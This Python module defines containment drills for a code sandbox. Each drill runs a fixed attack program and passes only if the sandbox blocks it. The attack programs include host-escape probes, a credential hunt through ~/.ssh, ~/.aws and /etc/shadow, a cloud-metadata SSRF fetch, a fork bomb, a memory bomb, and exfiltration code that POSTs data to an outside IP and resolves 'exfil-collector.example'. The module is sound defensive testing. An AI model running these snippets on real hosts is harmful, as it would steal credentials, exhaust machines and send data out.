"""Containment drills: fixed attack programs run in the real sandbox.

Each drill states what it attempts, what *should* happen, and checks the
actual run result. On the DEV-UNSAFE backend, drills that would be
meaningless or harmful on a laptop are reported as skipped, never as passed.
"""

from __future__ import annotations

import json
import os
import re
import uuid
from dataclasses import dataclass
from typing import Callable

from .models import BrowseRequest, ExecRequest, Limits, RunResult

SECRET_NAME = re.compile(r"(TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|ACCESS_?KEY|PRIVATE|CREDENTIAL|AWS_|VULTR)", re.I)


@dataclass
class Drill:
    id: str
    title: str
    attempt: str
    expected: str
    code: str | None = None
    limits: Limits | None = None
    check: Callable[[RunResult], tuple[bool, str]] | None = None
    dev_safe: bool = True
    kind: str = "exec"  # exec | browse | persistence


def _json_stdout(r: RunResult) -> dict:
    for line in reversed(r.stdout.strip().splitlines()):
        try:
            return json.loads(line)
        except ValueError:
            continue
    return {}


D1_CODE = r'''
import os, json, subprocess
r = {}
try:
    env1 = open("/proc/1/environ", "rb").read().decode(errors="replace").split("\x00")
    r["pid1_env_names"] = sorted({e.split("=", 1)[0] for e in env1 if e})
except Exception as e:
    r["pid1_env_names"] = f"denied: {type(e).__name__}"
r["docker_sock"] = os.path.exists("/var/run/docker.sock")
try:
    p = subprocess.run(["mount", "-t", "tmpfs", "x", "/mnt"], capture_output=True, text=True, timeout=5)
    r["mount_rc"] = p.returncode
except Exception as e:
    r["mount_rc"] = f"error: {type(e).__name__}"
r["uid"] = os.getuid() if hasattr(os, "getuid") else None
try:
    r["kernel"] = open("/proc/version").read().strip()[:160]
except Exception as e:
    r["kernel"] = f"n/a ({type(e).__name__})"
print(json.dumps(r))
'''


def _check_d1(r):
    d = _json_stdout(r)
    names = d.get("pid1_env_names")
    leaked = [n for n in names if SECRET_NAME.search(n)] if isinstance(names, list) else []
    ok = d.get("docker_sock") is False and d.get("mount_rc") not in (0, None) and d.get("uid") != 0 and not leaked
    return ok, f"docker.sock={d.get('docker_sock')}, mount rc={d.get('mount_rc')}, uid={d.get('uid')}, secret-like env={leaked or 'none'}, kernel={d.get('kernel', '')[:60]}"


D2_CODE = r'''
import json
r = {}
for p in ["/etc/airlock_probe", "/input/airlock_probe", "/usr/local/lib/airlock_probe"]:
    try:
        open(p, "w").write("x"); r[p] = "WRITTEN"
    except Exception as e:
        r[p] = f"blocked: {type(e).__name__}"
try:
    open("/out/allowed.txt", "w").write("ok"); r["/out/allowed.txt"] = "written (expected)"
except Exception as e:
    r["/out/allowed.txt"] = f"error: {e}"
print(json.dumps(r))
'''


def _check_d2(r):
    d = _json_stdout(r)
    bad = [k for k, v in d.items() if v == "WRITTEN"]
    return (bool(d) and not bad), (f"writes outside /out: {bad}" if bad else "all writes outside /out blocked; /out writable")


D3_CODE = r'''
import os, json
print(json.dumps({"env_names": sorted(os.environ.keys())}))
'''


def _check_d3(r):
    names = _json_stdout(r).get("env_names", [])
    leaked = [n for n in names if SECRET_NAME.search(n)]
    return (not leaked and bool(r.stdout)), f"{len(names)} env vars, all from the image ({', '.join(names[:6])}…); secret-like: {leaked or 'none'}"


D4_CODE = r'''
import os, glob, json
home = os.path.expanduser("~")
targets = [home + "/.aws", home + "/.ssh", home + "/.config", home + "/.docker", "/root", "/etc/shadow",
           "/srv", "/var/run/secrets", "/run/secrets"]
found = {}
for t in targets:
    try:
        if os.path.isdir(t):
            found[t] = os.listdir(t)[:5]
        elif os.path.isfile(t):
            open(t).read(10); found[t] = "READABLE"
    except Exception as e:
        pass
print(json.dumps({"found": found}))
'''


def _check_d4(r):
    found = _json_stdout(r).get("found", {})
    real = {k: v for k, v in found.items() if v}  # empty dirs aren't credentials
    return (not real), (f"found: {real}" if real else "no credential files or directories reachable")


D5_CODE = r'''
import urllib.request, json
try:
    body = urllib.request.urlopen("http://169.254.169.254/v1.json", timeout=3).read(200)
    print(json.dumps({"metadata": "REACHED", "body": body.decode(errors="replace")}))
except Exception as e:
    print(json.dumps({"metadata": f"unreachable: {type(e).__name__}: {e}"[:200]}))
'''


def _check_d5(r):
    m = _json_stdout(r).get("metadata", "")
    return m.startswith("unreachable"), m


D6_CODE = r'''
import os, time, sys
n = 0
try:
    while True:
        pid = os.fork()
        if pid == 0:
            time.sleep(20)
            os._exit(0)
        n += 1
except Exception as e:
    print(f"fork stopped after {n} processes: {type(e).__name__}: {e}", flush=True)
'''


def _check_d6(r):
    m = re.search(r"fork stopped after (\d+)", r.stdout)
    if m:
        return int(m.group(1)) < 512, f"fork bomb stopped after {m.group(1)} processes (pids cap)"
    return r.killed_reason in ("pids", "timeout", "oom"), f"killed_reason={r.killed_reason}"


D7_CODE = r'''
chunks = []
for i in range(60):
    chunks.append(bytearray(50 * 1024 * 1024))
    print(f"allocated {(i + 1) * 50} MB", flush=True)
print("NOT STOPPED: allocated 3000 MB")
'''


def _check_d7(r):
    last = (r.stdout.strip().splitlines() or ["nothing"])[-1]
    ok = "NOT STOPPED" not in r.stdout
    return ok, f"killed_reason={r.killed_reason}; last output: {last}"


D8_CODE = "while True:\n    pass\n"


def _check_d8(r):
    return r.killed_reason == "timeout", f"killed_reason={r.killed_reason} after {r.duration_ms} ms"


D9_WRITE = r'''
open("/tmp/airlock_flag", "w").write("left behind")
open("/out/flag", "w").write("left behind")
print("flag written")
'''
D9_READ = r'''
import os, json
print(json.dumps({"tmp_flag": os.path.exists("/tmp/airlock_flag"), "out_flag": os.path.exists("/out/flag")}))
'''

D10A_CODE = r'''
import json, socket, urllib.request
r = {}
try:
    socket.getaddrinfo("exfil-collector.example", 80)
    r["dns"] = "RESOLVED"
except Exception as e:
    r["dns"] = f"failed: {type(e).__name__}"
try:
    s = socket.create_connection(("1.1.1.1", 443), timeout=3); s.close()
    r["tcp_1.1.1.1"] = "CONNECTED"
except Exception as e:
    r["tcp_1.1.1.1"] = f"failed: {type(e).__name__}: {e}"[:120]
try:
    urllib.request.urlopen(urllib.request.Request("http://93.184.215.14/collect", data=b"secrets=none", method="POST"), timeout=3)
    r["http_post"] = "SENT"
except Exception as e:
    r["http_post"] = f"failed: {type(e).__name__}"
print(json.dumps(r))
'''


def _check_d10a(r):
    d = _json_stdout(r)
    bad = [k for k, v in d.items() if v in ("RESOLVED", "CONNECTED", "SENT")]
    return (bool(d) and not bad), (f"egress succeeded: {bad}" if bad else "; ".join(f"{k}: {v}" for k, v in d.items()))


DRILLS: list[Drill] = [
    Drill("D1", "Host escape probes", "Read PID 1's environment, look for docker.sock, try to mount a filesystem",
          "No host data, no docker socket, mount refused, not root", D1_CODE, Limits(timeout_s=15), _check_d1, dev_safe=False),
    Drill("D2", "Write outside /out", "Write into /etc, /input and the Python install",
          "Read-only filesystem errors; only /out is writable", D2_CODE, Limits(timeout_s=15), _check_d2, dev_safe=False),
    Drill("D3", "Environment dump", "Print every environment variable",
          "Only the image's harmless defaults; zero secrets", D3_CODE, Limits(timeout_s=15), _check_d3),
    Drill("D4", "Credential hunt", "Look for ~/.aws, ~/.ssh, ~/.docker, /root, /etc/shadow, mounted secrets",
          "Nothing found", D4_CODE, Limits(timeout_s=15), _check_d4, dev_safe=False),
    Drill("D5", "Cloud metadata SSRF", "Fetch Vultr instance metadata at 169.254.169.254",
          "Network unreachable", D5_CODE, Limits(timeout_s=15), _check_d5, dev_safe=False),
    Drill("D6", "Fork bomb", "Spawn processes until the machine falls over",
          "Stopped by the pids cap; host unaffected", D6_CODE, Limits(timeout_s=20, pids=64), _check_d6, dev_safe=False),
    Drill("D7", "Memory bomb", "Allocate 3 GB in 50 MB chunks",
          "Killed at the 512 MB memory cap", D7_CODE, Limits(timeout_s=30, memory_mb=512), _check_d7, dev_safe=False),
    Drill("D8", "Infinite loop", "Spin the CPU forever",
          "Killed by the wall-clock timeout", D8_CODE, Limits(timeout_s=5), _check_d8),
    Drill("D9", "Persistence between runs", "Run 1 leaves a file behind; run 2 looks for it",
          "Run 2 sees a fresh sandbox", kind="persistence"),
    Drill("D10a", "Data exfiltration", "DNS lookup, raw TCP to 1.1.1.1, HTTP POST to an outside IP",
          "No network interface: every attempt fails", D10A_CODE, Limits(timeout_s=20), _check_d10a, dev_safe=False),
    Drill("D10b", "Browser to private network", "Make the sandboxed browser open the metadata service and the runner's own API",
          "Egress proxy denies private ranges and logs it", kind="browse", dev_safe=False),
]


def catalogue() -> list[dict]:
    return [{"id": d.id, "title": d.title, "attempt": d.attempt, "expected": d.expected} for d in DRILLS]


def run_drill(backend, drill_id: str) -> dict:
    d = next((x for x in DRILLS if x.id == drill_id), None)
    if d is None:
        raise KeyError(drill_id)
    base = {"id": d.id, "title": d.title, "attempt": d.attempt, "expected": d.expected}
    if backend.name != "docker" and not d.dev_safe:
        return {**base, "passed": None, "actual": "skipped: only meaningful on the real gVisor sandbox (dev backend has no isolation)", "runs": []}

    rid = lambda: f"drill-{d.id.lower()}-{uuid.uuid4().hex[:10]}"  # noqa: E731
    if d.kind == "persistence":
        r1 = backend.exec(ExecRequest(run_id=rid(), kind="drill", code=D9_WRITE, limits=Limits(timeout_s=15)))
        r2 = backend.exec(ExecRequest(run_id=rid(), kind="drill", code=D9_READ, limits=Limits(timeout_s=15)))
        seen = _json_stdout(r2)
        ok = bool(seen) and not seen.get("tmp_flag") and not seen.get("out_flag")
        return {**base, "passed": ok, "actual": f"run 2 saw /tmp flag={seen.get('tmp_flag')}, /out flag={seen.get('out_flag')}",
                "runs": [r1.model_dump(), r2.model_dump()]}
    if d.kind == "browse":
        targets = ["http://169.254.169.254/v1.json"]
        if os.environ.get("RUNNER_PRIVATE_IP"):
            targets.append(f"http://{os.environ['RUNNER_PRIVATE_IP']}:8700/v1/health")
        runs, verdicts = [], []
        for t in targets:
            r = backend.browse(BrowseRequest(run_id=rid(), url=t, timeout_s=15))
            runs.append(r.model_dump())
            denied = any(e.get("decision") == "deny" for e in r.extra.get("proxy_log", []))
            leaked = "instanceid" in json.dumps(r.extra.get("page_text", "")).lower() or "runtime_available" in json.dumps(r.extra.get("page_text", ""))
            verdicts.append((denied and not leaked, f"{t}: {'denied by proxy' if denied else 'NOT denied'}{', content leaked' if leaked else ''}"))
        return {**base, "passed": all(v for v, _ in verdicts), "actual": "; ".join(m for _, m in verdicts), "runs": runs}

    r = backend.exec(ExecRequest(run_id=rid(), kind="drill", code=d.code, limits=d.limits or Limits()))
    passed, actual = d.check(r)
    return {**base, "passed": passed, "actual": actual, "runs": [r.model_dump()]}
